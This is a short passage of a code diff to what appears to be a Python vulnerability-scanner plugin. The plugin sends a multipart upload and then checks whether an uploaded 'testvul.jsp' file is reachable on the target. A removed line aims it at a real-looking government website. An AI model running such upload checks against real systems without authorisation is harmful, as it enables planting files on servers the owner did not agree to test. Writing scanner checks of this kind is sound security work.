@@ -38,14 +38,14 @@ Content-Disposition: form-data; name="submit"
 
 sub
 ------WebKitFormBoundarydGdAZ2plNzduNYMp--''' %m[0]
-        shell=arg+'defaultroot/devform/workflow/testvul.jsp'
-        code1,head1,body1,errcode,fina_url=curl.curl2(url,raw=raw)
-        if code1 ==200:
-            code2,head2,body2,errcode,fina_url=curl.curl2(shell)
-            if code2== 200 and 'testvul_test' in body2:
-                security_hole(url)
-                return arg
+    shell=arg+'defaultroot/devform/workflow/testvul.jsp'        
+    code1,head1,body1,errcode,fina_url=curl.curl2(url,raw=raw)
+    if code1 ==200:
+        code2,head2,body2,errcode,fina_url=curl.curl2(shell)
+        if code2== 200 and 'testvul_test' in body2:
+            security_hole(url)
 
-if __name__ == '__main__':
+
+            return arg
+if __name__== '__main__':
     from dummy import *
-    audit(assign('whezeip', 'http://www.gxdot.gov.cn/')[1])
